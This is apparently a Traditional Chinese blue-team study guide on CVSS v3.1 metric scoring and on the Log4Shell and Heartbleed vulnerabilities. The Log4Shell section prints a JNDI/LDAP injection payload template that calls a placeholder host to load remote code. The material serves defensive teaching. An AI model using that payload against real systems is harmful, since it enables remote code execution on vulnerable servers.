# 🎯 漏洞通用評分系統 (CVSS) 與重大 CVE 深度剖析 (Vulnerability Metrics)
> 對應藍隊防衛矩陣：**領域 22** (22.1 ~ 22.2)
> 預計總投入時間：**30 ~ 40 小時**（金盾獎計算題核心必考）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                     這份路徑帶你到達的位置
──────────────────               ────────────────────────────
只看漏洞高危/低危標籤    ──►    精通 CVSS v3.1 向量公式與基本指標權重計算
分不清 Scope 變更意義    ──►    深入理解 Scope: Changed (S:C) 對跳板提權的意義
聽過 Log4j 但不知原理    ──►    能逆推 JNDI/LDAP 注入與 Heartbleed 越界讀取機制
```

---

## 🗺️ 整體學習地圖（四個階段）

```
階段一 → 階段二 → 階段三 → 階段四
CVSS指標量化計算  向量字串解析  Log4Shell深入逆推  Heartbleed/Spring4Shell
(10h)            (8h)          (10h)              (8h)
```

---

## 📊 階段一：CVSS v3.1 基本指標群 (Base Metrics)（約 10 小時）

### 1.1 可利用性指標群 (Exploitability Metrics)
1. **攻擊途徑 (Attack Vector - AV)**：
   - `Network (N)`: 網路遠端利用 (0.85)
   - `Adjacent (A)`: 鄰近網路/同網段 (0.62)
   - `Local (L)`: 本地存取 (0.55)
   - `Physical (P)`: 實體接觸設備 (0.20)
2. **攻擊複雜度 (Attack Complexity - AC)**：`Low (L)` (0.77) vs `High (H)` (0.44)
3. **所需權限 (Privileges Required - PR)**：`None (N)`, `Low (L)`, `High (H)`
4. **使用者互動 (User Interaction - UI)**：`None (N)` (0.85) vs `Required (R)` (0.62)

### 1.2 範疇變更 (Scope - S)
- **Unchanged (U)**: 受害元件即為漏洞所在元件。
- **Changed (C)**: 漏洞可突破沙箱、虛擬機或容器邊界，衝擊其他權限區域（如虛擬化逃逸）。

### 1.3 衝擊指標群 (Impact Metrics: C / I / A)
- **Confidentiality (C)**、**Integrity (I)**、**Availability (A)**：評估值皆為 `High (H)`, `Low (L)`, `None (N)`。

---

## 🪵 階段二：重大歷史 CVE 深入剖析（約 10 小時）

### 2.1 Log4Shell (CVE-2021-44228) — CVSS 10.0 (滿分)
- **CVSS 向量**：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **攻擊機制**：
  1. 輸入包含 `${jndi:ldap://[HOST]/a}` 載荷。
  2. Log4j 2 記錄時自動觸發 JNDI 解析器連線惡意 LDAP 伺服器。
  3. LDAP 伺服器回傳惡意 Java 類別參照，受害者 JVM 自動下載並執行任意代碼 (RCE)。

### 2.2 Heartbleed (CVE-2014-0160) — OpenSSL 心跳越界讀取
- 利用 TLS 心跳請求未校驗載荷長度欄位與實際封包長度的一致性。
- 伺服器直接回傳長達 64KB 之鄰近記憶體資料，洩漏私鑰與使用者工作階段。

---

## 📋 自我評估檢查點

- [ ] 說出 CVSS 指標中 AV:N, AC:L, PR:N, UI:N, S:C, C:H, I:H, A:H 分別代表什麼意涵。
- [ ] 說明為什麼 Log4Shell 能夠被評定為滿分 10.0（Scope: Changed + 全無門檻遠端 RCE）。
- [ ] 清楚說明 OpenSSL Heartbleed 記憶體洩漏的本質缺陷。
